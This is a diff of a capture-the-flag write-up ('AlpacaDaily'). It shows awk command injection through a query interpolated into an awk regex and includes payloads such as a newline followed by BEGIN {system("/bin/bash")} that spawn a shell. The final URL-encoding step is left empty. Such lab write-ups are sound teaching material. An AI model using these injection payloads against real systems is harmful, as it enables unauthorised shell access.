@@ -1,4 +1,4 @@
---------------
+<img width="1824" height="252" alt="image" src="https://github.com/user-attachments/assets/ea5572fe-d5bf-4028-9d96-18011835f92f" />--------------
 
 ### AlpacaDaily
 
@@ -518,4 +518,31 @@ command = ["awk", f"/{query}/", "info.log"]
 
 >BEGIN {system("/bin/sh")}
 
-- Playing with python interpreter-:
+- Playing with the code in python interpreter, I tested with a new line and got an error `^ unexpected newline or end of string\n`
+
+<img width="1824" height="252" alt="image" src="https://github.com/user-attachments/assets/48990b7c-973c-48d6-a668-4eb0540e504c" />
+
+- Now, I matched the two slashes with `/` to fit the two slashes in it.I got no error.
+
+<img width="1295" height="251" alt="image" src="https://github.com/user-attachments/assets/4972625e-bb04-48b0-a47b-df6d7e06dab1" />
+
+- Then, I tried to check if the regex parser also executes perl code.I placed the `BEGIN` code in the new lines middle and got a `/bin/sh` shell.
+
+```python3
+>>> command = ["awk", '//\nBEGIN {system("/bin/bash")}', "info.log"]
+>>> result = subprocess.run(
+...             command,
+...             text=True
+...         )
+
+```
+<img width="755" height="157" alt="image" src="https://github.com/user-attachments/assets/8c5acde9-3001-45a5-80dc-4a739586f7f8" />
+
+- Urlencoding it to read the flag-:
+
+```
+```
+
+
+
+
